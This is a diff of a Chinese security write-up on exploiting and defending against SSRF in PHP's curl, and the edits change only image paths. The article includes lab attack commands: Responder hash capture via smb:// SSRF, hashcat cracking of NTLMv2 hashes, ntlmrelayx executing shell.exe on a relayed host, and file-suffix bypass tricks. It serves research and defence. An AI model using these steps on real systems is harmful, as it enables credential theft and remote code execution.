@@ -4,7 +4,7 @@
 
 以洞打洞看PHP下的SSRF的攻与防
 
-- - -
+* * *
 
 ## 前言
 
@@ -18,11 +18,11 @@
 
 ### 漏洞点1
 
-[![](assets/1701134864-e1ce8a28d0eebb5af3dcb5739f293a01.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142732-0c2f61a2-8cee-1.png)
+[![](assets/1701606471-e1ce8a28d0eebb5af3dcb5739f293a01.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142732-0c2f61a2-8cee-1.png)
 
 如图可看到`get_head`未对用户输入进行过滤，通过`get_curl`可造成SSRF漏洞，不过这个漏洞因为是个盲SSRF，利用并不直观，故不展开。
 
-[![](assets/1701134864-a82a52d016a142780498e11b1c49eb8b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142749-16075306-8cee-1.png)
+[![](assets/1701606471-a82a52d016a142780498e11b1c49eb8b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142749-16075306-8cee-1.png)
 
 ### 漏洞点2
 
@@ -32,43 +32,43 @@
 
 正常开发逻辑，include 目录文件的内容应该主要是功能函数、类函数模块等不支持直接调用的，但是这里开发者并没有很严谨，提供直接调用入口。
 
-[![](assets/1701134864-c5438b5a1f0275b6236fc89bbded1a47.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142804-1f070546-8cee-1.png)
+[![](assets/1701606471-c5438b5a1f0275b6236fc89bbded1a47.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142804-1f070546-8cee-1.png)
 
 当你顾名思义认为这可能是一个任意文件上传/任意文件下载的漏洞的时候，那么你很显然低估了开发者对安全的认知，仔细跟进它的代码，可以看到开发者其实对安全是有一定的了解的，但是并不全面也不深刻，所以造成漏洞的存在。
 
 上传漏洞的后缀一眼过去，找不到一点赋值可能，后面还有一个`empty`判断，这种顺序的写法，显然可以看出开发者对安全问题的有一定的重视。
 
-[![](assets/1701134864-66c12a227cf49678c50ec80148ff46b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142824-2ac1e52c-8cee-1.png)
+[![](assets/1701606471-66c12a227cf49678c50ec80148ff46b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142824-2ac1e52c-8cee-1.png)
 
 那么SSRF漏洞是怎么形成的呢？跟进`download_img`方法
 
-[![](assets/1701134864-e4dea86c1529145b22c5f7525d2ec8a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142838-33087f48-8cee-1.png)
+[![](assets/1701606471-e4dea86c1529145b22c5f7525d2ec8a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142838-33087f48-8cee-1.png)
 
 其中`remote_filesize` 没有限制任何协议，可惜的是，只回显长度，是一个盲SSRF，skip it， go on。
 
-[![](assets/1701134864-2f0869f6dc38b2ae22494e746f28f17c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142853-3c1535cc-8cee-1.png)
+[![](assets/1701606471-2f0869f6dc38b2ae22494e746f28f17c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142853-3c1535cc-8cee-1.png)
 
 继续跟进去，可以看到通过`pathinfo`的`PATHINFO_EXTENSION`获取到URL文件的后缀，并做白名单，限制只能为`jpg`、`gif`等图片资源。
 
-[![](assets/1701134864-8afae3dc27f152d37b4bdcc804107334.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142911-46e593fc-8cee-1.png)
+[![](assets/1701606471-8afae3dc27f152d37b4bdcc804107334.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142911-46e593fc-8cee-1.png)
 
 通过检验之后，`$url`会被`curl_setopt`进行处理，最终通过`curl_exec`造成SSRF漏洞，同时请求的结果`$data`最终会被写进到`$save_to`并返回值给客户端。
 
-[![](assets/1701134864-8c92bed7f0f64c951ab36d09efed34b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142927-503a2012-8cee-1.png)
+[![](assets/1701606471-8c92bed7f0f64c951ab36d09efed34b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142927-503a2012-8cee-1.png)
 
 下面是漏洞潜在利用的一个基本展示。
 
-[![](assets/1701134864-3d20406efe7b76ee8608c5ce73df8567.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142938-56b9e940-8cee-1.png)
+[![](assets/1701606471-3d20406efe7b76ee8608c5ce73df8567.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142938-56b9e940-8cee-1.png)
 
 根据返回结果，访问保存内容生成的图片URL，可成功回显出请求的数据。
 
-[![](assets/1701134864-b141f66b8a14f5ae6dc77369e74b7327.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142954-60d323b0-8cee-1.png)
+[![](assets/1701606471-b141f66b8a14f5ae6dc77369e74b7327.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142954-60d323b0-8cee-1.png)
 
 ## 提出一些问题
 
 PHP 已经是N年前的产物了，花样也已经被研究得差不多了，作者自认为对PHP的常见tricks还算是比较了解的，但面对这样的情况-该如何全面地去利用这个SSRF，内心却还是没有底。
 
-[![](assets/1701134864-4e07b629dc66ae7d4ffbd7378620ad84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143008-68b8f4b0-8cee-1.png)
+[![](assets/1701606471-4e07b629dc66ae7d4ffbd7378620ad84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143008-68b8f4b0-8cee-1.png)
 
 **首先，明确下目前环境条件：**
 
@@ -118,31 +118,31 @@ curl_close($ch);
 
 代码未对SSRF作任何限制。
 
-[![](assets/1701134864-773e95616858bca5b39dc298efe907a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143029-7552ed16-8cee-1.png)
+[![](assets/1701606471-773e95616858bca5b39dc298efe907a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143029-7552ed16-8cee-1.png)
 
 ## 深入 cURL 文档
 
 阅读PHP的官方文档: [https://www.php.net/manual/zh/curl.installation.php，了解到\`curl\_init\`等一系列方法，都是以模块\`--with-curl\`的方式集成进来的](https://www.php.net/manual/zh/curl.installation.php%EF%BC%8C%E4%BA%86%E8%A7%A3%E5%88%B0%60curl_init%60%E7%AD%89%E4%B8%80%E7%B3%BB%E5%88%97%E6%96%B9%E6%B3%95%EF%BC%8C%E9%83%BD%E6%98%AF%E4%BB%A5%E6%A8%A1%E5%9D%97%60--with-curl%60%E7%9A%84%E6%96%B9%E5%BC%8F%E9%9B%86%E6%88%90%E8%BF%9B%E6%9D%A5%E7%9A%84)
 
-[![](assets/1701134864-c69d9009a3802675f23ad967839e65d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143056-858eebe4-8cee-1.png)
+[![](assets/1701606471-c69d9009a3802675f23ad967839e65d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143056-858eebe4-8cee-1.png)
 
 PHP执行 `var_dump(curl_version)`，根据返回信息知测试PHP环境内置`curl`版本为`7.52.1`，编译的`libcurl`扩展内置支持如图所示 20 种网络协议。
 
-[![](assets/1701134864-3bf2bbb913ec7f5b4150d814a7849539.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143049-81498670-8cee-1.png)
+[![](assets/1701606471-3bf2bbb913ec7f5b4150d814a7849539.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143049-81498670-8cee-1.png)
 
 继续查阅 curl的`setopt`相关文档: [https://www.php.net/manual/en/function.curl-setopt.php](https://www.php.net/manual/en/function.curl-setopt.php) 发现提到一个属性 **`CURLOPT_REDIR_PROTOCOLS`** 跟允许**`CURLOPT_FOLLOWLOCATION`** 请求的协议紧密联系。
 
-[![](assets/1701134864-e5151d314cb77b14c6d90bc948e1e4f2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143124-96082d50-8cee-1.png)
+[![](assets/1701606471-e5151d314cb77b14c6d90bc948e1e4f2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143124-96082d50-8cee-1.png)
 
 文档中提到，默认的情况`cURL`处理重定向会支持除了 `FILE` 和 `SCP` 协议之外的所有协议，不过有一个例外需要重点注意 `pre-7.19.4`版本有点特殊。
 
 值的注意的是，不同系统的 `curl` 发行版默认支持的协议是存在差异的，比如在我的MacOS自带的`curl`，支持的协议列表就没有包括`SCP`协议，Win10下的`curl`自带的协议更少。
 
-[![](assets/1701134864-6ad5794a4d8ca6997dca152f9cde2421.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143137-9df2fde2-8cee-1.png)
+[![](assets/1701606471-6ad5794a4d8ca6997dca152f9cde2421.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143137-9df2fde2-8cee-1.png)
 
 但是在 ubuntu 22.0 自带 `curl` 是有 `scp` 协议的。
 
-[![](assets/1701134864-d7ffa0c006c4803878f57fac2ca05be7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143152-a6cb5f4a-8cee-1.png)
+[![](assets/1701606471-d7ffa0c006c4803878f57fac2ca05be7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143152-a6cb5f4a-8cee-1.png)
 
 > 读者须知！！！！！！
 > 
@@ -158,7 +158,7 @@ PHP执行 `var_dump(curl_version)`，根据返回信息知测试PHP环境内置`
 > 
 > SMBS协议（SMB Secure）是对SMB协议的安全扩展版本。它为SMB通信提供了加密和认证的功能，以确保数据的机密性和完整性。SMBS协议通过使用加密算法和数字证书来防止未经授权的访问和数据篡改，提供了更高的安全性。
 
-- - -
+* * *
 
 首先，了解下SMB的发展历史:
 
@@ -178,7 +178,7 @@ PHP执行 `var_dump(curl_version)`，根据返回信息知测试PHP环境内置`
 
 5.SMB 3.0 (前称 SMB 2.2) 在Windows 8 和 Windows Server 2012 中引入。
 
-- - -
+* * *
 
 一开始，由于对SMB协议版本不甚了解，`curl` 对于smb的官方文档介绍也很含糊，所以只能沿用常见的`smb`协议利用攻击手段进行黑盒测试，遇到了不少坑，兜兜转转，最终只能通过一些旁门左道勉强走通，回过头来看，才明白拥有阅读源码的能力多么重要，也不禁感慨那些开天劈地研究新东西的师傅是多么令人可敬。
 
@@ -223,11 +223,11 @@ docker run --network=host -it responder
 
 VirtualBox 新建一个虚拟机
 
-[![](assets/1701134864-fa44e02bf8f0a7722ff84bb33d772bb0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143215-b4ba55d4-8cee-1.png)
+[![](assets/1701606471-fa44e02bf8f0a7722ff84bb33d772bb0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143215-b4ba55d4-8cee-1.png)
 
 然后选择虚拟硬盘的时候使用现有的，即官方下载的虚拟机文件 \*.vdi,即可直接导入KaLi虚拟机。
 
-[![](assets/1701134864-195aa537a8305781d25fc6f6b60c1671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143234-c003f54e-8cee-1.png)
+[![](assets/1701606471-195aa537a8305781d25fc6f6b60c1671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143234-c003f54e-8cee-1.png)
 
 修改网络为Bridged(桥接），保证另一台 Windows 和 KaLi 在一个局域网里面。kaLI 已经内置responder
 
@@ -237,7 +237,7 @@ sudo responder -I eth0 -dwv
 
 不过很可惜，通过SSRF 访问`http://192.168.0.117/ssrf.php?url=smb://192.168.0.123/share/1.txt` ，甚至根据官方给出的`curl`
 
-[![](assets/1701134864-66756a41ded8710ff4885d45d3923ff5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143257-cd709d86-8cee-1.png)
+[![](assets/1701606471-66756a41ded8710ff4885d45d3923ff5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143257-cd709d86-8cee-1.png)
 
 Responder 一点反应都没有，`curl_error($ch)`也没有任何信息，一切看起来都静悄悄地，甚至我一度怀疑`smb`协议是一个摆设?
 
@@ -251,7 +251,7 @@ nmap --script=smb2-security-mode.nse -p445  192.168.0.114
 
 SMB签名除了域控其他系统默认都是不开启的，所以一开始我的想法很大胆，当然后面通过实验，验证很多想法是不成立的，一开始本是想着如果1）成立可获得高权限凭证，那么直接smb中继自己/其他人，甚至可以超越SSRF实现命令执行，但是现连NTLM劫持都做不了，又谈何中继呢？ 失败！
 
-[![](assets/1701134864-b38813a1e7c593c15dc12072e364f21a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143315-d82904de-8cee-1.png)
+[![](assets/1701606471-b38813a1e7c593c15dc12072e364f21a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143315-d82904de-8cee-1.png)
 
 ### NTLM 攻击灵感
 
@@ -267,11 +267,11 @@ SMB access smuggling via FILE URL on Windows
 
 > libcurl <= 7.68.0
 
-[![](assets/1701134864-09e30471ba05642e092328243af98c54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143347-ebb63936-8cee-1.png)
+[![](assets/1701606471-09e30471ba05642e092328243af98c54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143347-ebb63936-8cee-1.png)
 
 所以，如果构造如下请求，上面两种的基于SMB攻击从理论上来说都是可以实现的。
 
-[![](assets/1701134864-35a5196d5e19afe4fc390e4c802788eb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143338-e658517c-8cee-1.png)
+[![](assets/1701606471-35a5196d5e19afe4fc390e4c802788eb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143338-e658517c-8cee-1.png)
 
 ```plain
 # 解压 rockyou.txt.gz
@@ -280,7 +280,7 @@ gzip -d /usr/share/wordlists/rockyou.txt.gz
 sudo hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.0.123.txt /usr/share/wordlists/rockyou.txt
 ```
 
-[![](assets/1701134864-466ddf3bbc44e6ffb96e11ae9aaa85d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143411-f9cdde0c-8cee-1.png)
+[![](assets/1701606471-466ddf3bbc44e6ffb96e11ae9aaa85d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143411-f9cdde0c-8cee-1.png)
 
 成功爆破到administrator账户密码为123456，下面尝试利用Relay中继尝试升级SSRF漏洞为RCE漏洞。
 
@@ -301,7 +301,7 @@ sudo responder -I eth0 -v
 sudo impacket-ntlmrelayx  -t 192.168.0.128 -smb2support -e "shell.exe"
 ```
 
-[![](assets/1701134864-1f414eed5ceb64cffe94dab4776d0d33.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143420-ff604508-8cee-1.png)
+[![](assets/1701606471-1f414eed5ceb64cffe94dab4776d0d33.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143420-ff604508-8cee-1.png)
 
 理想环境下似乎很给力，不过这种攻击方式有明显局限性:
 
@@ -315,7 +315,7 @@ sudo impacket-ntlmrelayx  -t 192.168.0.128 -smb2support -e "shell.exe"
 
 此Patch补丁主要修复 NTLM反射漏洞 CVE 2008-4037， 现在已经2023年了，已经是非常古老的古老的利用方式，实战可用性并不高。
 
-[![](assets/1701134864-de1818d2a0cf323854cd882bfa1110a1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143436-08b1d068-8cef-1.png)
+[![](assets/1701606471-de1818d2a0cf323854cd882bfa1110a1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143436-08b1d068-8cef-1.png)
 
 ### 从 cURL 看 SMB 协议
 
@@ -327,39 +327,39 @@ sudo impacket-ntlmrelayx  -t 192.168.0.128 -smb2support -e "shell.exe"
 
 如图可知，一定要这样的格式才能触发出正确的TCP请求: `smb://host/sharename/` 非常严格，缺一斜杠一目录都不可，要不然就发不出去请求。
 
-[![](assets/1701134864-aecdb382455f97ddbc2ca2b194ada69a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143454-1334d09e-8cef-1.png)
+[![](assets/1701606471-aecdb382455f97ddbc2ca2b194ada69a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143454-1334d09e-8cef-1.png)
 
 不过这个情况，建立TCP连接就被`FIN`，说明客户端主动关闭连接，要发出`Negotiate Request`，必须携带用户名和密码请求:
 
 smb://user:passwd@192.168.0.114/share/1.txt
 
-[![](assets/1701134864-dc48bd1d6962d01a0ca1336df411778f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143508-1be20b4e-8cef-1.png)
+[![](assets/1701606471-dc48bd1d6962d01a0ca1336df411778f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143508-1be20b4e-8cef-1.png)
 
 如图所示，这次是服务端拒绝请求`RST`，为什么还是不行呢？ 在`curl`的github仓库有个issue: [support smbv2/3 and/or update documentation](https://github.com/curl/curl/issues/5679)
 
-[![](assets/1701134864-c195ae96c4b9ecc95769a04997fd0557.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143522-2433438a-8cef-1.png)
+[![](assets/1701606471-c195ae96c4b9ecc95769a04997fd0557.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143522-2433438a-8cef-1.png)
 
 后来官方提交了 commit 提到这个问题: [https://github.com/curl/curl/pull/5686/commits/a63738aae3df97628ba2566594bf3c56c0d71ae7](https://github.com/curl/curl/pull/5686/commits/a63738aae3df97628ba2566594bf3c56c0d71ae7) ,至此才能通过man命令看到这个"坑点。
 
-[![](assets/1701134864-d3f66f017af8e34a740be26b5e1e211e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143533-2a6a35a6-8cef-1.png)
+[![](assets/1701606471-d3f66f017af8e34a740be26b5e1e211e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143533-2a6a35a6-8cef-1.png)
 
 当然通过分析 `Negotiate Protocol Request` 也可以知道，客户端只支持`NT LM 0.12`
 
-[![](assets/1701134864-b9918f4ea8fc7e23a3fd11a44e801e61.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143551-357a22bc-8cef-1.png)
+[![](assets/1701606471-b9918f4ea8fc7e23a3fd11a44e801e61.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143551-357a22bc-8cef-1.png)
 
 前往控制面板 -> 启用或关闭 windows 功能 -> 安装打开 SMB1.0/CIFS 文件共享支持
 
 > 由于 Windows 10 Fall Creators Update 和 Windows Server 版本 1709 (RS3)，默认情况下不再安装服务器消息块版本 1 (SMBv1) 网络协议。 从 2007 年开始，它被 SMBv2 和后来的协议所取代。 Microsoft 在 2014 年公开弃用了 SMBv1 协议。
 
-[![](assets/1701134864-011aa05706bf66a665f650751a0183ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143603-3c5b088a-8cef-1.png)
+[![](assets/1701606471-011aa05706bf66a665f650751a0183ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143603-3c5b088a-8cef-1.png)
 
 此时重新进行SSRF请求，可以看到能够正常请求到`无密码保护的`共享目录下的文件，很多时候 `c:\Users\`也会被开启。
 
-[![](assets/1701134864-ec1f27dbda1ff6a8cb35ab081ea54410.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143611-41681732-8cef-1.png)
+[![](assets/1701606471-ec1f27dbda1ff6a8cb35ab081ea54410.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143611-41681732-8cef-1.png)
 
 通过WireShark的通信流量可以看到当不输入密码的时候会以`Guest`状态访问可以正常访问，反之则会通过密码进行验证，密码不对则无法访问。
 
-[![](assets/1701134864-84f83ee2c7e7fd5b2dce3f2b536c6c9b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143620-46bc91ea-8cef-1.png)
+[![](assets/1701606471-84f83ee2c7e7fd5b2dce3f2b536c6c9b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143620-46bc91ea-8cef-1.png)
 
 ## Fuzz 测试
 
@@ -369,11 +369,11 @@ SSRF 基于 SMB 的攻击面依然还是有限，下面通过Fuzz的方式看看
 
 Window libcurl: 7.64.0
 
-[![](assets/1701134864-d3f3080e3efef31640a0ad2bcd820e6b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143637-5095fae4-8cef-1.png)
+[![](assets/1701606471-d3f3080e3efef31640a0ad2bcd820e6b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143637-5095fae4-8cef-1.png)
 
 经过测试可以知道Window下通过 # 和 ? 可以绕过后缀限制。
 
-[![](assets/1701134864-71d4f4de8895788e6816df9d244840b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145618-107b0c1c-8cf2-1.png)
+[![](assets/1701606471-71d4f4de8895788e6816df9d244840b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145618-107b0c1c-8cf2-1.png)
 
 **OSX libcurl: 7.52.1**
 
@@ -437,11 +437,11 @@ for($pos=0; $pos<count($validArrays);$pos++){
 
 状态码部分更多介绍可以详细参考 [https://everything.curl.dev/http/redirects](https://everything.curl.dev/http/redirects)
 
-[![](assets/1701134864-094ca913f2dd86d4ad8a29421c975f25.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150206-e05aac94-8cf2-1.png)
+[![](assets/1701606471-094ca913f2dd86d4ad8a29421c975f25.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150206-e05aac94-8cf2-1.png)
 
 如上图所示，对于 `curl` 来说与浏览器不同的是，面对状态码是301还是302，甚至303，是没有区别的，不过还有一些有意思的状态码，可以决定了第二次请求的HTTP Method。
 
-[![](assets/1701134864-ed524e9e658fd54b9e65303bfee4fbb4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150217-e6e0f1cc-8cf2-1.png)
+[![](assets/1701606471-ed524e9e658fd54b9e65303bfee4fbb4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150217-e6e0f1cc-8cf2-1.png)
 
 测试代码
 
@@ -474,7 +474,7 @@ exit();
 ?>
 ```
 
-[![](assets/1701134864-5cff7d00ccd14b661124cc1f0745905f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145648-225ce220-8cf2-1.png)
+[![](assets/1701606471-5cff7d00ccd14b661124cc1f0745905f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145648-225ce220-8cf2-1.png)
 
 `libcurl` 默认是发送`GET`的，`POST` 需要设置 `curl_setopt($ch, CURLOPT_POST, true);` ，如果是301-303则无论客户第一次请求的方法是什么统一为`GET`,如果是307-308，则请求方法由第一次的请求方法决定。
 
@@ -521,17 +521,17 @@ tftp://192.168.0.105:10039
 
 Burp Intruder 单线程，延迟3s 进行测试
 
-[![](assets/1701134864-d7ac6452cdeb7a7ca0f4466dcc367d16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145735-3e79b550-8cf2-1.png)
+[![](assets/1701606471-d7ac6452cdeb7a7ca0f4466dcc367d16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145735-3e79b550-8cf2-1.png)
 
 file协议和smb协议因为语法构造不正确，自然是发不出去网络请求的，其他的基本都可以发起请求，开始实验组重定向,会发现结果是一样的。
 
-[![](assets/1701134864-b0c35dc6abf93324d39188233a5ffe94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145743-43584d34-8cf2-1.png)
+[![](assets/1701606471-b0c35dc6abf93324d39188233a5ffe94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145743-43584d34-8cf2-1.png)
 
 **注意事项**
 
 测试302跳转的时候，Burp 不要设置并发，可能是`libcurl` 实现机制问题产生覆盖会导致很多请求包丢失，对结果造成影响。
 
-[![](assets/1701134864-d8b06e7ef3a849987a05c0d0bea9a8f0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145801-4de7ea70-8cf2-1.png)
+[![](assets/1701606471-d8b06e7ef3a849987a05c0d0bea9a8f0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145801-4de7ea70-8cf2-1.png)
 
 **聚焦协议**
 
@@ -545,19 +545,19 @@ SSRF 重点关注四类协议: 1) file 2) gopher 3) dict 4) smb
 
 1）重定向默认不支持file协议
 
-[![](assets/1701134864-dd9668d67bf547caee3234b50f2dc272.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145817-57a42786-8cf2-1.png)
+[![](assets/1701606471-dd9668d67bf547caee3234b50f2dc272.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145817-57a42786-8cf2-1.png)
 
 2) 重定向支持 file 协议
 
-[![](assets/1701134864-390aabb1ad3727d27fc05e0e587bcdc2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145835-6262829e-8cf2-1.png)
+[![](assets/1701606471-390aabb1ad3727d27fc05e0e587bcdc2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145835-6262829e-8cf2-1.png)
 
 3) 重定向支持 dict 协议
 
-[![](assets/1701134864-f534b55976f2e6a221df1657483ddbb8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145844-67b142f8-8cf2-1.png)
+[![](assets/1701606471-f534b55976f2e6a221df1657483ddbb8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145844-67b142f8-8cf2-1.png)
 
 4) 重定向默认不支持 smb 协议
 
-[![](assets/1701134864-463c034e2783a2a9f0918e7979f7c671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145854-6d62e832-8cf2-1.png)
+[![](assets/1701606471-463c034e2783a2a9f0918e7979f7c671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145854-6d62e832-8cf2-1.png)
 
 ## 防御SSRF思路
 
@@ -579,7 +579,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
 ```
 
-[![](assets/1701134864-05cda94dabc333148fda76ab1564c9cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145921-7d894b66-8cf2-1.png)
+[![](assets/1701606471-05cda94dabc333148fda76ab1564c9cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145921-7d894b66-8cf2-1.png)
 
 令人感到有趣的是,就算强制设置`FILE`协议，一样也是不支持的，具体原因就需要去到底层分析源码了。
 
